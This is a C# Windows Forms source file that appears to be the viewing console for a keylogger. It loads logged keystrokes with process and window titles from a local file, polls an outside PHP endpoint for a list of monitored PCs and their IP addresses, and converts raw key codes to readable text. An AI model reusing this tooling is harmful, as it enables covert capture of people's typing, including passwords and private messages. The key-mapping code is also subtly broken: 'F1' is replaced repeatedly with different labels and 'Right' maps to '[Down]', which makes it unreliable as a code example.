using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using IdpaTools;
using System.Net;
using System.Net.Sockets;
using System.IO;

namespace IdpaClient
{
    public partial class Form1 : Form
    {
        private const string LOG_PATH = @"C:\Temp\log.xml";
        private const string URI_GET_PCINFO = @"http://www.swordbreacker.ch/idpa/getdata.php";
        private Logger logger;

        private PcInfromations pcInformations = new PcInfromations();

        public Form1()
        {
            InitializeComponent();
            logger = new Logger();
            GetKeyLoggerData();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            adressInfo.Start();
        }

        
        private void GetKeyLoggerData()
        {
            logger = Serilizer.getDataFromFile(LOG_PATH, logger);

            foreach (ApplicationLog app in logger.applicationLog)
            {
                string[] rowData = new string[4];

                string keyString = "";

                foreach (string key in app.keyList)
                {
                    keyString += key;
                }

                keyString = ReplaceKeyStrings(keyString);

                rowData[0] = app.date.ToString();
                rowData[1] = app.processName;
                rowData[2] = app.windowName;
                rowData[3] = keyString;

                keyLoggerDataView.Rows.Add(rowData);
            }
        }

        private void getData_Click(object sender, EventArgs e)
        {
            eventLog.Text += "Starting download... \r\n";
            ConnectionManager.SendCommand("127.0.0.1", "ping");
            eventLog.AppendText("Ping: " + Program.stopwatch.Elapsed.Milliseconds + "\r\n");
            Program.stopwatch.Reset();
        }

        private void adressInfo_Tick(object sender, EventArgs e)
        {
            string xml = ConnectionManager.getPcInformations(URI_GET_PCINFO);

            pcInformations = FileManager.DeserializePcInformations(xml, pcInformations);

            foreach (Pc pc in pcInformations.pc)
            {
                ListViewItem lvi = new ListViewItem();
                lvi.Text = pc.name;
                lvi.Tag = pc.id;
                lvi.SubItems.Add(pc.ip);

                bool alredyExist = false;

                foreach (ListViewItem adressInfoList in adressinformation.Items)
                {
                    if (adressInfoList.Text == pc.name && adressInfoList.SubItems[1].Text == pc.ip)
                        alredyExist = true;
                }

                if (!alredyExist)
                {
                    int adressInfoId = -1;
                    foreach (ListViewItem adressInfoList in adressinformation.Items)
                    {
                        if (adressInfoList.Tag.ToString() == pc.id.ToString())
                        {
                            adressInfoId = adressInfoList.Index;
                        }
                    }

                    if (adressInfoId == -1)
                        adressinformation.Items.Add(lvi);
                    else
                    {
                        adressinformation.Items.RemoveAt(adressInfoId);
                        adressinformation.Items.Insert(adressInfoId, lvi);
                    }
                }
            }
        }

        private void search_Click(object sender, EventArgs e)
        {
            eventLog.Text += "Starting search of '" + searchBox.Text + "'... \r\n";
            eventLog.Text += "Search finished \r\n";
        }

        private void adressinformation_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void searchBox_TextChanged(object sender, EventArgs e)
        {
            foreach (DataGridViewRowCollection rowCollection in keyLoggerDataView.Rows)
            {
                
            }
        }

        private string ReplaceKeyStrings(string text)
        {
            text = text.Replace("Space", " ");
            text = text.Replace("LButton", "[LM]");
            text = text.Replace("RButton", "[RM]");
            text = text.Replace("OemPeriod", "[,]");
            text = text.Replace("OemPoint", "[.]");
            text = text.Replace("OemMinus", "[-]");
            text = text.Replace("RShiftKey", "[rShift]");
            text = text.Replace("LShiftKey", "[lShift]");
            text = text.Replace("CapsLock", "[caps]");
            text = text.Replace("Tab", "[tab]");
            text = text.Replace("Oem2", "[§]");
            text = text.Replace("D0", "[0]");
            text = text.Replace("D1", "[1]");
            text = text.Replace("D2", "[2]");
            text = text.Replace("D3", "[3]");
            text = text.Replace("D4", "[4]");
            text = text.Replace("D5", "[5]");
            text = text.Replace("D6", "[6]");
            text = text.Replace("D7", "[7]");
            text = text.Replace("D8", "[8]");
            text = text.Replace("D9", "[9]");
            text = text.Replace("Oem4", "[']");
            text = text.Replace("Ome6", "[^]");
            text = text.Replace("Back", "[Back]");
            text = text.Replace("F1", "[F1]");
            text = text.Replace("F1", "[F2]");
            text = text.Replace("F1", "[F3]");
            text = text.Replace("F1", "[F4]");
            text = text.Replace("F1", "[F5]");
            text = text.Replace("F1", "[F6]");
            text = text.Replace("F1", "[F7]");
            text = text.Replace("F1", "[F8]");
            text = text.Replace("F1", "[F9]");
            text = text.Replace("F1", "[F10]");
            text = text.Replace("F1", "[F11]");
            text = text.Replace("F1", "[F12]");
            text = text.Replace("Enter", "[Enter]");
            text = text.Replace("Add", "[+]");
            text = text.Replace("Substract", "[-]");
            text = text.Replace("Multiple", "[*]");
            text = text.Replace("Divide", "[/]");
            text = text.Replace("NumLock", "[NLock]");
            text = text.Replace("Up", "[Up]");
            text = text.Replace("Down", "[Down]");
            text = text.Replace("Right", "[Down]");
            text = text.Replace("Left", "[Left]");
            text = text.Replace("OemSemiclon", "[ü]");
            text = text.Replace("OemQuotes", "[ö]");
            text = text.Replace("OemPipe", "[ä]");
            text = text.Replace("Oemtilde", "[¨]");
            text = text.Replace("Oem8", "[$]");
            text = text.Replace("LWin", "[LWin]");
            text = text.Replace("RWin", "[RWin]");
            text = text.Replace("LControlKey", "[LCtrl]");
            text = text.Replace("RControlKey", "[RCtrl]");
            text = text.Replace("LMenu", "[Alt]");
            text = text.Replace("RMenu", "[AltGr]");
            text = text.Replace("Decimal", "[.]");
            text = text.Replace("Delte", "[Del]");
            text = text.Replace("End", "[End]");
            text = text.Replace("PageDown", "[PageDown]");
            text = text.Replace("Prior", "[PageUp]");
            text = text.Replace("Home", "[Home]");
            text = text.Replace("NumPad0", "[0]");
            text = text.Replace("NumPad1", "[1]");
            text = text.Replace("NumPad2", "[2]");
            text = text.Replace("NumPad3", "[3]");
            text = text.Replace("NumPad4", "[4]");
            text = text.Replace("NumPad5", "[5]");
            text = text.Replace("NumPad6", "[6]");
            text = text.Replace("NumPad7", "[7]");
            text = text.Replace("NumPad8", "[8]");
            text = text.Replace("NumPad9", "[9]");
            
            return text;
        }

    }
}

